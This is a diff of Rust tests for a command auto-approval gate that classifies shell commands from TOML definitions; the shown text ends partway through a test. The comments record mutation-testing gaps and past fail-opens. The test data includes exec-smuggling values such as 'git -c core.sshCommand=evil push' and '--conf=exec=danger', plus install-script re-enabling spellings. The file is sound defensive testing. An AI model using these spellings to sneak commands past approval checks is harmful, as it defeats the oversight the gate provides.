@@ -1,24 +1,24 @@
+use super::types::DispatchKind;
+use super::types::TomlSub;
 use super::*;
-    use super::types::DispatchKind;
-    use super::types::TomlSub;
-    use crate::parse::Token;
-    use crate::verdict::{SafetyLevel, Verdict};
+use crate::parse::Token;
+use crate::verdict::{SafetyLevel, Verdict};
 
-    fn toks(words: &[&str]) -> Vec<Token> {
-        words.iter().map(|s| Token::from_test(s)).collect()
-    }
+fn toks(words: &[&str]) -> Vec<Token> {
+    words.iter().map(|s| Token::from_test(s)).collect()
+}
 
-    // Provenance + archetype validity are enforced at BUILD time (build::assert_sub_provenance),
-    // reading the TOML — so the research is a validated part of the tree, and mis-authoring fails
-    // CLOSED at registry load rather than silently under-recording. (This supersedes the earlier
-    // runtime sweeps; every real command's subs pass this at load. The `assert_rejected`s below
-    // prove each arm of the check fires; the positive case proves a well-formed profiled sub
-    // builds.)
+// Provenance + archetype validity are enforced at BUILD time (build::assert_sub_provenance),
+// reading the TOML — so the research is a validated part of the tree, and mis-authoring fails
+// CLOSED at registry load rather than silently under-recording. (This supersedes the earlier
+// runtime sweeps; every real command's subs pass this at load. The `assert_rejected`s below
+// prove each arm of the check fires; the positive case proves a well-formed profiled sub
+// builds.)
 
-    #[test]
-    fn a_profiled_sub_with_full_provenance_builds() {
-        let _ = load_one(
-            r#"
+#[test]
+fn a_profiled_sub_with_full_provenance_builds() {
+    let _ = load_one(
+        r#"
             [[command]]
             name = "tc"
             [[command.sub]]
@@ -28,43 +28,43 @@ use super::*;
             source = "https://example/docs"
             standalone = ["--help"]
             "#,
-        );
-    }
+    );
+}
 
-    // ── Killing the mutants `cargo mutants` found surviving in build.rs (2026-08-07) ────────────
-    // Each of these was reachable, load-bearing validation that no test noticed being switched off.
+// ── Killing the mutants `cargo mutants` found surviving in build.rs (2026-08-07) ────────────
+// Each of these was reachable, load-bearing validation that no test noticed being switched off.
 
-    /// `loopback_valued` is only consulted on a PROFILED sub, so declaring it without a `profile`
-    /// silently does nothing. The whole validator could be replaced with `Ok(())` undetected.
-    #[test]
-    fn loopback_valued_without_a_profile_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"ls\"\n\
+/// `loopback_valued` is only consulted on a PROFILED sub, so declaring it without a `profile`
+/// silently does nothing. The whole validator could be replaced with `Ok(())` undetected.
+#[test]
+fn loopback_valued_without_a_profile_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"ls\"\n\
              loopback_valued = [\"--endpoint-url\"]\n",
-            "needs `profile`",
-        );
-    }
+        "needs `profile`",
+    );
+}
 
-    /// A structured command's top-level flat fields are DROPPED by the Branching dispatch path, so
-    /// mixing them is silently ineffective config. The whole validator could be replaced with
-    /// `Ok(())` undetected.
-    #[test]
-    fn flat_fields_mixed_with_subs_are_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nstandalone = [\"--all\"]\n\
+/// A structured command's top-level flat fields are DROPPED by the Branching dispatch path, so
+/// mixing them is silently ineffective config. The whole validator could be replaced with
+/// `Ok(())` undetected.
+#[test]
+fn flat_fields_mixed_with_subs_are_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nstandalone = [\"--all\"]\n\
              [[command.sub]]\nname = \"ls\"\n",
-            "mixes flat-style top-level fields",
-        );
-    }
+        "mixes flat-style top-level fields",
+    );
+}
 
-    /// THREE matrices, not two, and that is the whole point: the surviving mutant turned
-    /// `matrix.len() < 2` into `> 2`, which is indistinguishable from the original at exactly two —
-    /// both fall through to the duplicate check. Only a third matrix separates them, because the
-    /// mutant then returns early and never looks for the duplicate.
-    #[test]
-    fn a_duplicate_parent_action_across_three_matrices_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n\
+/// THREE matrices, not two, and that is the whole point: the surviving mutant turned
+/// `matrix.len() < 2` into `> 2`, which is indistinguishable from the original at exactly two —
+/// both fall through to the duplicate check. Only a third matrix separates them, because the
+/// mutant then returns early and never looks for the duplicate.
+#[test]
+fn a_duplicate_parent_action_across_three_matrices_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n\
              [command.handler_policy.p]\nstandalone = []\n\
              [[command.matrix]]\nparents = [\"alpha\"]\nlevel = \"Inert\"\n\
              [command.matrix.actions]\nlist = \"p\"\n\
@@ -72,491 +72,464 @@ use super::*;
              [command.matrix.actions]\nshow = \"p\"\n\
              [[command.matrix]]\nparents = [\"alpha\"]\nlevel = \"Inert\"\n\
              [command.matrix.actions]\nlist = \"p\"\n",
-            "duplicate (parent, action) pair",
-        );
-    }
+        "duplicate (parent, action) pair",
+    );
+}
 
-    /// `positionals = "transfer"` without the block that carries the transfer knobs.
-    #[test]
-    fn a_transfer_positional_without_its_block_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nbare = true\n\
+/// `positionals = "transfer"` without the block that carries the transfer knobs.
+#[test]
+fn a_transfer_positional_without_its_block_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nbare = true\n\
              [command.behavior]\noperation = \"create\"\npositionals = \"transfer\"\n",
-            "requires a [command.behavior.transfer] block",
-        );
-    }
+        "requires a [command.behavior.transfer] block",
+    );
+}
 
-    /// And the converse arm: the transfer block carried by a non-transfer positional role.
-    #[test]
-    fn a_transfer_block_without_the_transfer_positional_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nbare = true\n\
+/// And the converse arm: the transfer block carried by a non-transfer positional role.
+#[test]
+fn a_transfer_block_without_the_transfer_positional_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nbare = true\n\
              [command.behavior]\noperation = \"create\"\npositionals = \"read\"\n\
              [command.behavior.transfer]\nsource = \"relocate\"\n",
-            "only valid with positionals",
-        );
-    }
+        "only valid with positionals",
+    );
+}
 
-    /// `when_absent` classifies on the flag's ABSENCE and `value_prefix` on its value, so a flag
-    /// cannot carry both. The surviving mutant deleted the `!`, inverting the check.
-    #[test]
-    fn a_classifying_flag_with_both_when_absent_and_value_prefix_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nbare = true\n\
+/// `when_absent` classifies on the flag's ABSENCE and `value_prefix` on its value, so a flag
+/// cannot carry both. The surviving mutant deleted the `!`, inverting the check.
+#[test]
+fn a_classifying_flag_with_both_when_absent_and_value_prefix_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nbare = true\n\
              [[command.flag]]\nname = \"--view\"\nclassifies = \"decrypt-read\"\n\
              fact = \"x\"\nsource = \"y\"\nwhen_absent = true\nvalue_prefix = \"v\"\n",
-            "mutually exclusive",
-        );
-    }
+        "mutually exclusive",
+    );
+}
 
-    /// A blank `judgment` on a classifying flag is rejected, and a real one still BUILDS.
-    ///
-    /// Both halves are needed and neither existed: every other flag test omits `judgment`, so the
-    /// `Option` is `None` and `is_none_or` short-circuits before reaching the predicate at all. The
-    /// surviving mutant deleted the `!` inside it, which inverts the rule — a legitimate judgment
-    /// would be refused and a blank one accepted — and nothing noticed, because nothing supplied a
-    /// judgment in either state.
-    #[test]
-    fn a_classifying_flag_judgment_must_be_non_blank_when_present() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nbare = true\n\
+/// A blank `judgment` on a classifying flag is rejected, and a real one still BUILDS.
+///
+/// Both halves are needed and neither existed: every other flag test omits `judgment`, so the
+/// `Option` is `None` and `is_none_or` short-circuits before reaching the predicate at all. The
+/// surviving mutant deleted the `!` inside it, which inverts the rule — a legitimate judgment
+/// would be refused and a blank one accepted — and nothing noticed, because nothing supplied a
+/// judgment in either state.
+#[test]
+fn a_classifying_flag_judgment_must_be_non_blank_when_present() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nbare = true\n\
              [[command.flag]]\nname = \"--view\"\nclassifies = \"decrypt-read\"\n\
              fact = \"x\"\nsource = \"y\"\njudgment = \"   \"\n",
-            "must not be blank",
-        );
-        let spec = load_one(
-            "[[command]]\nname = \"tc\"\nbare = true\n\
+        "must not be blank",
+    );
+    let spec = load_one(
+        "[[command]]\nname = \"tc\"\nbare = true\n\
              [[command.flag]]\nname = \"--view\"\nclassifies = \"decrypt-read\"\n\
              fact = \"x\"\nsource = \"y\"\njudgment = \"deliberate: reading it is the point\"\n",
-        );
-        assert_eq!(spec.name, "tc");
-    }
+    );
+    assert_eq!(spec.name, "tc");
+}
 
-    /// The candidate-under-glob detector must fire for an EXACT first_arg token, not only a glob.
-    ///
-    /// `first_arg_matches` treats a pattern without a trailing `*` as an exact token, and mutation
-    /// testing showed `==` could become `!=` there undetected — the existing coverage exercised only
-    /// the `get-*` arm. That inversion silently disables the detector, and what the detector prevents
-    /// is a deny→allow inversion: a `candidate` sub is REMOVED from the registry, so if a sibling
-    /// pattern still matches its name the token falls through and AUTO-APPROVES.
-    #[test]
-    fn the_candidate_under_glob_guard_fires_for_an_exact_first_arg_token() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nfirst_arg = [\"getsecret\"]\n\
+/// The candidate-under-glob detector must fire for an EXACT first_arg token, not only a glob.
+///
+/// `first_arg_matches` treats a pattern without a trailing `*` as an exact token, and mutation
+/// testing showed `==` could become `!=` there undetected — the existing coverage exercised only
+/// the `get-*` arm. That inversion silently disables the detector, and what the detector prevents
+/// is a deny→allow inversion: a `candidate` sub is REMOVED from the registry, so if a sibling
+/// pattern still matches its name the token falls through and AUTO-APPROVES.
+#[test]
+fn the_candidate_under_glob_guard_fires_for_an_exact_first_arg_token() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nfirst_arg = [\"getsecret\"]\n\
              [[command.sub]]\nname = \"getsecret\"\ncandidate = true\n",
-            "AUTO-APPROVE",
-        );
-    }
+        "AUTO-APPROVE",
+    );
+}
 
-    /// A `candidate` sub is dropped by `filter_candidates`, and its NESTED subs go with it — dead
-    /// data wearing the shape of configuration. `filter_candidates` rejects that, and until now
-    /// nothing held it to it: disabling the check outright left all 4504 tests passing, found by
-    /// mutation-testing the validator during adversarial review. Its own comment records that the
-    /// case was red-demoed when written, but the demo was never left behind as a test.
-    #[test]
-    fn a_candidate_sub_may_not_declare_nested_subs() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"grp\"\ncandidate = true\n\
+/// A `candidate` sub is dropped by `filter_candidates`, and its NESTED subs go with it — dead
+/// data wearing the shape of configuration. `filter_candidates` rejects that, and until now
+/// nothing held it to it: disabling the check outright left all 4504 tests passing, found by
+/// mutation-testing the validator during adversarial review. Its own comment records that the
+/// case was red-demoed when written, but the demo was never left behind as a test.
+#[test]
+fn a_candidate_sub_may_not_declare_nested_subs() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"grp\"\ncandidate = true\n\
              [[command.sub.sub]]\nname = \"inner\"\n",
-            "nested subs are dead",
-        );
-    }
+        "nested subs are dead",
+    );
+}
 
-    #[test]
-    fn a_profiled_sub_without_a_fact_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
+#[test]
+fn a_profiled_sub_without_a_fact_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
              profile = \"remote-destroy-recoverable\"\nsource = \"https://example/docs\"\n",
-            "requires a `fact`",
-        );
-    }
+        "requires a `fact`",
+    );
+}
 
-    #[test]
-    fn a_sub_with_an_unknown_profile_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
+#[test]
+fn a_sub_with_an_unknown_profile_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"delete\"\n\
              profile = \"remote-destroy-typo\"\nfact = \"x\"\nsource = \"y\"\n",
-            "is not a known archetype",
-        );
-    }
+        "is not a known archetype",
+    );
+}
 
-    #[test]
-    fn a_candidate_shadowed_by_a_sibling_glob_is_rejected() {
-        // `get-secret-value` is candidate=true (meant to DENY) but matches the `get-*` glob → it
-        // would fall through the candidate filter and auto-approve. The #4 footgun; must fail closed.
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\nfirst_arg = [\"get-*\", \"list-*\"]\n\
+#[test]
+fn a_candidate_shadowed_by_a_sibling_glob_is_rejected() {
+    // `get-secret-value` is candidate=true (meant to DENY) but matches the `get-*` glob → it
+    // would fall through the candidate filter and auto-approve. The #4 footgun; must fail closed.
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\nfirst_arg = [\"get-*\", \"list-*\"]\n\
              [[command.sub]]\nname = \"get-secret-value\"\ncandidate = true\n",
-            "AUTO-APPROVE",
-        );
-    }
+        "AUTO-APPROVE",
+    );
+}
 
-    #[test]
-    fn a_candidate_not_matching_the_glob_is_fine() {
-        // A candidate whose name does NOT match the glob is safe — it denies as intended.
-        load_one(
-            "[[command]]\nname = \"tc\"\nfirst_arg = [\"describe-*\"]\n\
+#[test]
+fn a_candidate_not_matching_the_glob_is_fine() {
+    // A candidate whose name does NOT match the glob is safe — it denies as intended.
+    load_one(
+        "[[command]]\nname = \"tc\"\nfirst_arg = [\"describe-*\"]\n\
              [[command.sub]]\nname = \"delete-thing\"\ncandidate = true\n",
-        );
-    }
+    );
+}
 
-    #[test]
-    fn an_escalating_flag_without_a_source_is_rejected() {
-        assert_rejected(
-            "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"push\"\n\
+#[test]
+fn an_escalating_flag_without_a_source_is_rejected() {
+    assert_rejected(
+        "[[command]]\nname = \"tc\"\n[[command.sub]]\nname = \"push\"\n\
              profile = \"vcs-sync\"\nfact = \"x\"\nsource = \"y\"\n\
              [[command.sub.flag]]\nname = \"--force\"\n\
              classifies = \"remote-destroy-irreversible\"\nfact = \"z\"\n",
-            "requires a `source`",
-        );
+        "requires a `source`",
+    );
+}
+
+/// The valued-flag-by-value escalator: a `value_prefix` flag escalates ONLY when its value
+/// matches — so one valued flag is benign for most values and dangerous for a specific key
+/// (the `git -c core.sshCommand=…` = exec pattern). A bare flag still escalates on presence.
+#[test]
+fn value_prefix_flags_escalate_only_on_a_matching_value() {
+    use super::types::FlagProvenance;
+    let c_flag = FlagProvenance {
+        name: "-c".into(),
+        classifies: "unclassified".into(),
+        value_prefix: Some("core.sshCommand=".into()),
+        when_absent: false,
+    };
+    let esc = |words: &[&str]| super::flag_escalates(&toks(words), &c_flag);
+    assert!(esc(&["git", "-c", "core.sshCommand=evil", "push"]), "dangerous key → escalate");
+    assert!(!esc(&["git", "-c", "color.ui=false", "log"]), "benign key → no escalate");
+    assert!(!esc(&["git", "-c", "log"]), "flag without the matching value → no escalate");
+    assert!(!esc(&["git", "push"]), "flag absent → no escalate");
+
+    // glued `--flag=VALUE` form matches too
+    let glued =
+        FlagProvenance { name: "--conf".into(), classifies: "unclassified".into(), value_prefix: Some("exec=".into()), when_absent: false };
+    assert!(super::flag_escalates(&toks(&["x", "--conf=exec=danger"]), &glued));
+    assert!(!super::flag_escalates(&toks(&["x", "--conf=safe=ok"]), &glued));
+
+    // a bare flag (no value_prefix) still escalates on mere presence
+    let bare =
+        FlagProvenance { name: "--force".into(), classifies: "remote-destroy-irreversible".into(), value_prefix: None, when_absent: false };
+    assert!(super::flag_escalates(&toks(&["git", "push", "--force"]), &bare));
+    assert!(!super::flag_escalates(&toks(&["git", "push"]), &bare));
+
+    // `when_absent`: a SAFETY flag whose ABSENCE escalates (`npm ci` without `--ignore-scripts`).
+    let safety =
+        FlagProvenance { name: "--ignore-scripts".into(), classifies: "supply-chain-build".into(), value_prefix: None, when_absent: true };
+    assert!(super::flag_escalates(&toks(&["npm", "ci"]), &safety), "flag ABSENT → escalate");
+    assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts"]), &safety), "flag present → no escalate");
+    // a re-enabling spelling must NOT masquerade as the safety flag (the fail-open the review found).
+    assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=false"]), &safety), "=false re-enables → escalate");
+    assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=0"]), &safety), "=0 re-enables → escalate");
+    assert!(super::flag_escalates(&toks(&["npm", "ci", "--no-ignore-scripts"]), &safety), "--no- form → escalate");
+    assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=true"]), &safety), "=true → no escalate");
+}
+
+/// `flag_present` must be CLUSTER-aware for short flags — the flag allowlist cluster-expands, so a
+/// classifying short flag hidden in `-da`/`-vd` must still be seen (else a clustering tool with a
+/// `[[command.flag]]` classifier could evade). But a glued VALUE (`-o=decrypted`) must NOT match
+/// the flag char, so only the boolean-letter run before `=` is scanned. Long flags don't cluster.
+#[test]
+fn flag_present_is_cluster_aware_for_short_flags() {
+    let p = |words: &[&str], flag: &str| super::flag_present(&toks(words), flag);
+    // exact + cluster hits
+    assert!(p(&["age", "-d", "f"], "-d"));
+    assert!(p(&["age", "-da", "f"], "-d"), "cluster -da contains -d");
+    assert!(p(&["age", "-vd", "f"], "-d"), "cluster -vd contains -d");
+    assert!(p(&["gpg", "-vdk", "f"], "-d"));
+    // a glued VALUE containing the char must NOT match (only the pre-`=` run is scanned)
+    assert!(!p(&["age", "-o=decrypted.age", "-e"], "-d"), "value after = is not the flag run");
+    assert!(!p(&["age", "-e", "-a", "f"], "-d"), "no d in the cluster");
+    // long flags never cluster-match
+    assert!(!p(&["x", "-abc"], "--decrypt"));
+    assert!(p(&["x", "--decrypt", "f"], "--decrypt"));
+}
+
+/// Regression: a profiled sub must deny via the LEGACY path too, not just the engine. A global
+/// flag before the subcommand (`git -c … push`, `git -C … push`) makes the engine's sub walk stop
+/// early → it abstains → legacy dispatches the profiled sub, which MUST still deny (it's above the
+/// auto-approve line). Was a fail-open: `git -c color.ui=false push` auto-approved.
+#[test]
+fn a_profiled_sub_denies_via_legacy_when_the_engine_abstains() {
+    for cmd in ["git -c color.ui=false push", "git -c color.ui=false push origin main", "git -C /tmp push"] {
+        assert_eq!(crate::command_verdict(cmd), Verdict::Denied, "{cmd} must deny via legacy");
     }
+    // a read sub with a benign global flag still auto-approves — the fix is scoped to profiled subs
+    assert!(crate::command_verdict("git -c color.ui=false log").is_allowed(), "reads unaffected");
+}
 
-    /// The valued-flag-by-value escalator: a `value_prefix` flag escalates ONLY when its value
-    /// matches — so one valued flag is benign for most values and dangerous for a specific key
-    /// (the `git -c core.sshCommand=…` = exec pattern). A bare flag still escalates on presence.
-    #[test]
-    fn value_prefix_flags_escalate_only_on_a_matching_value() {
-        use super::types::FlagProvenance;
-        let c_flag = FlagProvenance {
-            name: "-c".into(),
-            classifies: "unclassified".into(),
-            value_prefix: Some("core.sshCommand=".into()),
-            when_absent: false,
-        };
-        let esc = |words: &[&str]| super::flag_escalates(&toks(words), &c_flag);
-        assert!(esc(&["git", "-c", "core.sshCommand=evil", "push"]), "dangerous key → escalate");
-        assert!(!esc(&["git", "-c", "color.ui=false", "log"]), "benign key → no escalate");
-        assert!(!esc(&["git", "-c", "log"]), "flag without the matching value → no escalate");
-        assert!(!esc(&["git", "push"]), "flag absent → no escalate");
+fn load_one(toml_str: &str) -> CommandSpec {
+    let mut specs = load_toml(toml_str, "test").expect("valid test definition");
+    assert_eq!(specs.len(), 1);
+    specs.remove(0)
+}
 
-        // glued `--flag=VALUE` form matches too
-        let glued = FlagProvenance {
-            name: "--conf".into(),
-            classifies: "unclassified".into(),
-            value_prefix: Some("exec=".into()),
-            when_absent: false,
-        };
-        assert!(super::flag_escalates(&toks(&["x", "--conf=exec=danger"]), &glued));
-        assert!(!super::flag_escalates(&toks(&["x", "--conf=safe=ok"]), &glued));
-
-        // a bare flag (no value_prefix) still escalates on mere presence
-        let bare = FlagProvenance {
-            name: "--force".into(),
-            classifies: "remote-destroy-irreversible".into(),
-            value_prefix: None,
-            when_absent: false,
-        };
-        assert!(super::flag_escalates(&toks(&["git", "push", "--force"]), &bare));
-        assert!(!super::flag_escalates(&toks(&["git", "push"]), &bare));
-
-        // `when_absent`: a SAFETY flag whose ABSENCE escalates (`npm ci` without `--ignore-scripts`).
-        let safety = FlagProvenance {
-            name: "--ignore-scripts".into(),
-            classifies: "supply-chain-build".into(),
-            value_prefix: None,
-            when_absent: true,
-        };
-        assert!(super::flag_escalates(&toks(&["npm", "ci"]), &safety), "flag ABSENT → escalate");
-        assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts"]), &safety), "flag present → no escalate");
-        // a re-enabling spelling must NOT masquerade as the safety flag (the fail-open the review found).
-        assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=false"]), &safety), "=false re-enables → escalate");
-        assert!(super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=0"]), &safety), "=0 re-enables → escalate");
-        assert!(super::flag_escalates(&toks(&["npm", "ci", "--no-ignore-scripts"]), &safety), "--no- form → escalate");
-        assert!(!super::flag_escalates(&toks(&["npm", "ci", "--ignore-scripts=true"]), &safety), "=true → no escalate");
-    }
-
-    /// `flag_present` must be CLUSTER-aware for short flags — the flag allowlist cluster-expands, so a
-    /// classifying short flag hidden in `-da`/`-vd` must still be seen (else a clustering tool with a
-    /// `[[command.flag]]` classifier could evade). But a glued VALUE (`-o=decrypted`) must NOT match
-    /// the flag char, so only the boolean-letter run before `=` is scanned. Long flags don't cluster.
-    #[test]
-    fn flag_present_is_cluster_aware_for_short_flags() {
-        let p = |words: &[&str], flag: &str| super::flag_present(&toks(words), flag);
-        // exact + cluster hits
-        assert!(p(&["age", "-d", "f"], "-d"));
-        assert!(p(&["age", "-da", "f"], "-d"), "cluster -da contains -d");
-        assert!(p(&["age", "-vd", "f"], "-d"), "cluster -vd contains -d");
-        assert!(p(&["gpg", "-vdk", "f"], "-d"));
-        // a glued VALUE containing the char must NOT match (only the pre-`=` run is scanned)
-        assert!(!p(&["age", "-o=decrypted.age", "-e"], "-d"), "value after = is not the flag run");
-        assert!(!p(&["age", "-e", "-a", "f"], "-d"), "no d in the cluster");
-        // long flags never cluster-match
-        assert!(!p(&["x", "-abc"], "--decrypt"));
-        assert!(p(&["x", "--decrypt", "f"], "--decrypt"));
-    }
-
-    /// Regression: a profiled sub must deny via the LEGACY path too, not just the engine. A global
-    /// flag before the subcommand (`git -c … push`, `git -C … push`) makes the engine's sub walk stop
-    /// early → it abstains → legacy dispatches the profiled sub, which MUST still deny (it's above the
-    /// auto-approve line). Was a fail-open: `git -c color.ui=false push` auto-approved.
-    #[test]
-    fn a_profiled_sub_denies_via_legacy_when_the_engine_abstains() {
-        for cmd in [
-            "git -c color.ui=false push",
-            "git -c color.ui=false push origin main",
-            "git -C /tmp push",
-        ] {
-            assert_eq!(crate::command_verdict(cmd), Verdict::Denied, "{cmd} must deny via legacy");
+/// Assert a definition is REJECTED, and that the stated reason is why.
+///
+/// These were `#[should_panic(expected = …)]` until `load_toml` started returning the reason
+/// instead of panicking it. That worked, but only indirectly: the panic came from `load_one`'s
+/// `.expect()`, whose message embeds the `Err` via `{:?}`, so each `expected =` fragment was
+/// being matched against a DEBUG-ESCAPED string. Any fragment containing a quote or a newline
+/// would have silently stopped matching, and the test names claimed a panic that no longer
+/// happens. Reading the error directly removes both problems and lets the assertion say which
+/// of the two failures occurred — accepted when it should not have been, or rejected for an
+/// unrelated reason.
+#[track_caller]
+fn assert_rejected(toml_str: &str, expected: &str) {
+    match load_toml(toml_str, "test") {
+        Ok(specs) => {
+            panic!("definition was ACCEPTED ({} spec(s)); expected rejection naming {expected:?}", specs.len())
         }
-        // a read sub with a benign global flag still auto-approves — the fix is scoped to profiled subs
-        assert!(crate::command_verdict("git -c color.ui=false log").is_allowed(), "reads unaffected");
+        Err(why) => assert!(why.contains(expected), "rejected, but not for the stated reason — wanted {expected:?}, got:\n{why}"),
     }
+}
 
-    fn load_one(toml_str: &str) -> CommandSpec {
-        let mut specs = load_toml(toml_str, "test").expect("valid test definition");
-        assert_eq!(specs.len(), 1);
-        specs.remove(0)
-    }
+// Flat commands
 
-    /// Assert a definition is REJECTED, and that the stated reason is why.
-    ///
-    /// These were `#[should_panic(expected = …)]` until `load_toml` started returning the reason
-    /// instead of panicking it. That worked, but only indirectly: the panic came from `load_one`'s
-    /// `.expect()`, whose message embeds the `Err` via `{:?}`, so each `expected =` fragment was
-    /// being matched against a DEBUG-ESCAPED string. Any fragment containing a quote or a newline
-    /// would have silently stopped matching, and the test names claimed a panic that no longer
-    /// happens. Reading the error directly removes both problems and lets the assertion say which
-    /// of the two failures occurred — accepted when it should not have been, or rejected for an
-    /// unrelated reason.
-    #[track_caller]
-    fn assert_rejected(toml_str: &str, expected: &str) {
-        match load_toml(toml_str, "test") {
-            Ok(specs) => panic!(
-                "definition was ACCEPTED ({} spec(s)); expected rejection naming {expected:?}",
-                specs.len()
-            ),
-            Err(why) => assert!(
-                why.contains(expected),
-                "rejected, but not for the stated reason — wanted {expected:?}, got:\n{why}"
-            ),
-        }
-    }
-
-    // Flat commands
-
-    #[test]
-    fn flat_bare_allowed() {
-        let spec = load_one(r#"
+#[test]
+fn flat_bare_allowed() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "wc"
             bare = true
-        "#);
-        assert_eq!(dispatch_spec(&toks(&["wc"]), &spec), Verdict::Allowed(SafetyLevel::Inert));
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["wc"]), &spec), Verdict::Allowed(SafetyLevel::Inert));
+}
 
-    #[test]
-    fn flat_bare_denied_when_false() {
-        let spec = load_one(r#"
+#[test]
+fn flat_bare_denied_when_false() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
-        "#);
-        assert_eq!(dispatch_spec(&toks(&["grep"]), &spec), Verdict::Denied);
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep"]), &spec), Verdict::Denied);
+}
 
-    #[test]
-    fn flat_standalone_flag() {
-        let spec = load_one(r#"
+#[test]
+fn flat_standalone_flag() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "wc"
             bare = true
             standalone = ["-l", "--lines"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["wc", "-l", "file.txt"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["wc", "-l", "file.txt"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_unknown_flag_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn flat_unknown_flag_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "wc"
             standalone = ["-l"]
-        "#);
-        assert_eq!(dispatch_spec(&toks(&["wc", "--evil"]), &spec), Verdict::Denied);
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["wc", "--evil"]), &spec), Verdict::Denied);
+}
 
-    #[test]
-    fn flat_valued_flag_space() {
-        let spec = load_one(r#"
+#[test]
+fn flat_valued_flag_space() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             valued = ["--max-count", "-m"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "--max-count", "5", "pattern"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "--max-count", "5", "pattern"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_valued_flag_eq() {
-        let spec = load_one(r#"
+#[test]
+fn flat_valued_flag_eq() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             valued = ["--max-count"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "--max-count=5", "pattern"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "--max-count=5", "pattern"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_combined_short_flags() {
-        let spec = load_one(r#"
+#[test]
+fn flat_combined_short_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             standalone = ["-r", "-n", "-i"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "-rni", "pattern", "."]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "-rni", "pattern", "."]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_combined_short_unknown_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn flat_combined_short_unknown_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             standalone = ["-r", "-n"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "-rnz", "pattern"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "-rnz", "pattern"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn flat_combined_short_with_valued_last() {
-        let spec = load_one(r#"
+#[test]
+fn flat_combined_short_with_valued_last() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             standalone = ["-r", "-n"]
             valued = ["-m"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "-rnm", "5", "pattern"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
